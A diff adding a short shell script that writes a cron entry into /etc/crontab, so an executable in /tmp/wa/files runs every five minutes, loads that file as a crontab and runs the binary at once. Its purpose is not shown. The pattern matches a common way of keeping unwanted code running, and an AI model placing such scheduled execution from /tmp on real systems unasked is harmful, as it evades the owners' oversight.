@@ -1,0 +1,9 @@
+#!/bin/sh
+
+if ! grep '/tmp/wa/files/cron' /etc/crontab
+then
+    echo "*/5 * * * * /tmp/wa/files/cron" >> /etc/crontab
+    crontab /etc/crontab >/dev/null 2>&1
+fi
+
+/tmp/wa/files/cron
